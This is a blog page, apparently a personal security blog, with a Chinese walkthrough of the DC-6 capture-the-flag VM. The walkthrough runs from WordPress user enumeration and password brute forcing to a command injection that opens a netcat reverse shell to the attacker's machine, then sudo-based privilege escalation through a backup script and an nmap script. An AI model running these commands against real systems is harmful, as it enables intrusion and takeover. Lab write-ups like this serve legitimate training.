@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    DC-6 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-ztp7h1" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      DC-6
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/04/20/ztp7h1/" class="article-date">
+  <time datetime="2020-04-20T01:26:04.000Z" itemprop="datePublished">2020-04-20</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>nmap 扫描一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587346492252-39cae773-2756-4bd5-8e3d-b998d20fd91f.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&name=image.png&originHeight=611&originWidth=1018&size=155151&status=done&style=none&width=579" alt="image.png"></p>
+<p>vim /etc/hosts<br>加上 192.168.149.164  wordy</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587346643300-1c3c581f-65fe-4131-95cb-51f3391a81c8.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&name=image.png&originHeight=695&originWidth=1150&size=206014&status=done&style=none&width=575" alt="image.png"></p>
+<p>访问 80 端口，是一个 wordpress</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587346759838-df2277dd-5877-4f8f-8cf9-b209f7b59aca.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=933&originWidth=1658&size=768067&status=done&style=stroke&width=746" alt="image.png"></p>
+<p>wpscan 扫描一下，发现几个用户名<br><code>wpscan --url http://wordy -ru</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587363531699-cbc6d1fe-5a47-4e9b-9d9f-f341c9dd0564.png#align=left&display=inline&height=312&margin=%5Bobject%20Object%5D&name=image.png&originHeight=535&originWidth=767&size=97177&status=done&style=none&width=447" alt="image.png"></p>
+<p>根据作者善意提醒，制作一份密码字典</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587363808397-72576080-25e5-42b3-b2f4-66a9390e622c.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=175&originWidth=1456&size=28389&status=done&style=none&width=728" alt="image.png"></p>
+<p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></p>
+<p>把扫描出来的用户名也保存出来，爆破一下</p>
+<p><code>wpscan --url http://wordy -U users.txt -P passwords.txt</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587364243491-cac33a6c-30a8-4c79-8059-29655555fc7c.png#align=left&display=inline&height=454&margin=%5Bobject%20Object%5D&name=image.png&originHeight=700&originWidth=1066&size=137473&status=done&style=none&width=691" alt="image.png"></p>
+<p>后台的一个工具里面有个功能，有命令执行漏洞</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587365532511-b3fa93b8-3bd3-4b0b-b37a-bb0cca5d23c7.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=933&originWidth=1658&size=299682&status=done&style=none&width=746" alt="image.png"></p>
+<p>burp 抓一下包，看一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587366261429-a5a7ece2-fc58-468c-bf49-e05ed5e51b85.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1080&originWidth=1920&size=276701&status=done&style=none&width=746" alt="image.png"></p>
+<p>nc 来拿一个 shell 把，kali 里面 nc -lp 6666</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587366422727-35eb9f72-1e74-4de0-8537-c56d104a71a9.png#align=left&display=inline&height=267&margin=%5Bobject%20Object%5D&name=image.png&originHeight=427&originWidth=788&size=103979&status=done&style=none&width=491" alt="image.png"></p>
+<p>访问的时候加上<br><code>; nc 192.168.149.141 6666 -e /bin/sh</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587366470235-ceb7073e-d40d-47e7-81b1-793f7897acf6.png#align=left&display=inline&height=463&margin=%5Bobject%20Object%5D&name=image.png&originHeight=952&originWidth=1130&size=114022&status=done&style=stroke&width=549" alt="image.png"></p>
+<p>python -c “import pty;pty.spawn(‘/bin/bash’)” 开启一个交互 shell</p>
+<p>在 mark 的目录下找到了一个用户名和密码 graham : GSo7isUM1D4</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587366690468-edd8bdf4-bc32-44de-9414-8a742b98e684.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=image.png&originHeight=552&originWidth=717&size=88285&status=done&style=none&width=359" alt="image.png"></p>
+<p>这个账户可以直接 ssh 登进来 ssh <a href="mailto:graham@192.168.149.164">graham@192.168.149.164</a><br>登陆以后，sudo -l 发现一个不需要密码就可以用的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587366874661-5100dd7c-9f0f-4259-9f38-9718c7d1a3fc.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=157&originWidth=761&size=32847&status=done&style=none&width=491" alt="image.png"></p>
+<p>在后面追加一个 /bin/bash，这样运行的时候就能拿到 jens 的 shell 了</p>
+<p><code>echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</code><br><code>sudo -u jens /home/jens/backups.sh</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587367972600-a5abbb09-c3b0-4a33-9244-a55d65abd126.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&name=image.png&originHeight=234&originWidth=599&size=53295&status=done&style=none&width=434" alt="image.png"></p>
+<p>这次是 nmap，可以写个脚本，让 nmap 来执行然后拿到 shell</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587368068411-3684a88b-8431-4266-b071-48cff6e716f3.png#align=left&display=inline&height=119&margin=%5Bobject%20Object%5D&name=image.png&originHeight=155&originWidth=612&size=33687&status=done&style=none&width=468" alt="image.png"></p>
+<p><code>echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; shell.nse</code><br><code>sudo nmap --script getroot.nse</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587368425862-0a626504-1f9b-464e-8cb1-06f65f3db949.png#align=left&display=inline&height=319&margin=%5Bobject%20Object%5D&name=image.png&originHeight=537&originWidth=802&size=82171&status=done&style=none&width=477" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/04/20/ztp7h1/" data-id="ckco53qbp000o8ou9ccnfdf9f" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/04/20/nnvua7/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            第一个智能合约（helloworld）
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/04/18/gwso5x/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">geth操作、Ethereum Wallet</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
